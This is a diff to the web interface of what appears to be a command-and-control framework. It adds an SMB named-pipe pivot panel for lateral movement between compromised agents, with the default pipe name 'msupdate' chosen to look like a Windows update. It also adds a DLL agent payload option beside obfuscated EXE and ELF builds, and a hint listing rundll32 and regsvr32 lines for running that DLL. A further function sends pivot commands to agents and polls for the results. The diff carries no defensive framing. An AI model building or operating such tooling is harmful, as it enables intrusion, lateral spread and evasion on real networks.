@@ -600,7 +600,7 @@ tr.clickable { cursor: pointer; }
       </div>
 
       <!-- .NET Assembly Quick Execute (below terminal) -->
-      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:14px">
+      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;margin-top:14px">
         <div class="card">
           <div class="card-header"><h3><span>⚡</span> Upload & Execute .NET Assembly</h3></div>
           <div class="card-body padded">
@@ -679,6 +679,26 @@ tr.clickable { cursor: pointer; }
             </div>
           </div>
         </div>
+
+        <!-- SMB Pivot Control -->
+        <div class="card">
+          <div class="card-header"><h3><span>🔗</span> SMB Pivot</h3><span style="font-size:11px;color:var(--text-muted)">Named pipe relay</span></div>
+          <div class="card-body padded">
+            <p style="font-size:12px;color:var(--text-muted);margin-bottom:10px">Start a Win32 named pipe relay on this agent. Internal agents connect via <span style="color:var(--cyan);font-family:monospace">\\agent-host\pipe\&lt;name&gt;</span></p>
+            <div style="display:flex;gap:6px;margin-bottom:10px;align-items:end">
+              <div style="flex:1">
+                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Pipe Name</label>
+                <input id="pivot-pipe-name" value="msupdate" style="width:100%;padding:6px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
+              </div>
+            </div>
+            <div style="display:flex;gap:6px;margin-bottom:10px">
+              <button class="btn" onclick="sendPivotCmd('start')" style="flex:1;padding:7px;font-size:12px">▶ Start</button>
+              <button class="qbtn danger" onclick="sendPivotCmd('stop')" style="flex:1;padding:7px;font-size:12px">■ Stop</button>
+              <button class="qbtn" onclick="sendPivotCmd('list')" style="flex:1;padding:7px;font-size:12px">≡ List</button>
+            </div>
+            <div id="pivot-result" style="font-size:12px;font-family:monospace;color:var(--green);white-space:pre-wrap;min-height:32px"></div>
+          </div>
+        </div>
       </div>
     </div>
 
@@ -704,6 +724,7 @@ tr.clickable { cursor: pointer; }
                   <optgroup label="Agent Binaries">
                     <option value="exe">🪟 Windows EXE (amd64)</option>
                     <option value="exe-garble">🪟 Windows EXE (Obfuscated)</option>
+                    <option value="dll">📦 Windows DLL (rundll32 / regsvr32)</option>
                     <option value="elf">🐧 Linux ELF (amd64)</option>
                     <option value="elf-garble">🐧 Linux ELF (Obfuscated)</option>
                   </optgroup>
@@ -771,6 +792,17 @@ tr.clickable { cursor: pointer; }
                     <input type="radio" name="pl-obfuscation" value="garble"> Garble (full obfuscation)
                   </label>
                 </div>
+              </div>
+
+              <!-- DLL usage hint -->
+              <div id="pl-dll-hint" style="display:none;margin-bottom:10px;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;color:var(--text-muted)">
+                <div style="color:var(--cyan);font-weight:600;margin-bottom:4px">📦 DLL Execution Methods</div>
+                <div style="font-family:monospace;font-size:11px;line-height:1.8">
+                  rundll32.exe phantom.dll,Start<br>
+                  regsvr32 /s /i phantom.dll<br>
+                  regsvr32 phantom.dll
+                </div>
+                <div style="margin-top:4px;color:var(--text-muted)">After delivery, use <span style="color:var(--cyan)">pivot start</span> on the agent for SMB pivoting.</div>
               </div>
 
               <button onclick="generatePayload()" class="btn" style="width:100%;padding:12px;font-size:14px;" id="pl-btn">
@@ -2375,6 +2407,9 @@ function onPayloadTypeChange() {
   } else {
     appRow.style.display = 'none';
   }
+  // DLL usage hint
+  var hint = document.getElementById('pl-dll-hint');
+  if (hint) hint.style.display = type === 'dll' ? 'block' : 'none';
 }
 
 async function loadAppTemplates() {
@@ -3079,6 +3114,43 @@ async function termUploadFile() {
     if (data.error) { termLog('error', '✗ ' + data.error); return; }
     termLog('success', '✓ Upload queued: ' + remotePath + ' (' + data.size + ' bytes, task: ' + data.task_id.substring(0,8) + ')');
   } catch(e) { termLog('error', '✗ ' + e.message); }
+}
+
+// ──── SMB Pivot Control ────
+async function sendPivotCmd(action) {
+  var agent = document.getElementById('agent-select').value;
+  if (!agent) { document.getElementById('pivot-result').textContent = '✗ Select an agent first'; return; }
+  var pipeName = document.getElementById('pivot-pipe-name').value.trim() || 'msupdate';
+  var args = action === 'start' ? 'start ' + pipeName : action;
+  var el = document.getElementById('pivot-result');
+  el.style.color = 'var(--text-muted)';
+  el.textContent = '⏳ Sending pivot ' + action + '...';
+  try {
+    var resp = await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({agent: agent, command: 'pivot', args: args})});
+    var data = await resp.json();
+    if (data.error) { el.style.color='var(--red)'; el.textContent='✗ '+data.error; return; }
+    el.style.color = 'var(--text-muted)';
+    el.textContent = '⏳ Task queued: ' + data.task_id.substring(0,8) + '\nWaiting for result...';
+    // Poll for result
+    var tid = data.task_id;
+    for (var i = 0; i < 20; i++) {
+      await new Promise(r => setTimeout(r, 1500));
+      var tr = await fetch('/api/tasks'); var tdata = await tr.json();
+      var task = tdata.find(t => t.id === tid);
+      if (task && task.status === 'complete') {
+        el.style.color = 'var(--green)';
+        el.textContent = task.output || '[done]';
+        return;
+      }
+      if (task && task.status === 'error') {
+        el.style.color = 'var(--red)';
+        el.textContent = '✗ ' + (task.error || task.output);
+        return;
+      }
+    }
+    el.textContent = '⏳ Still running — check Tasks tab for output';
+  } catch(e) { el.style.color='var(--red)'; el.textContent='✗ '+e.message; }
 }
 
 // ──── .NET Assembly Execution (Settings page — kept for backward compat) ────
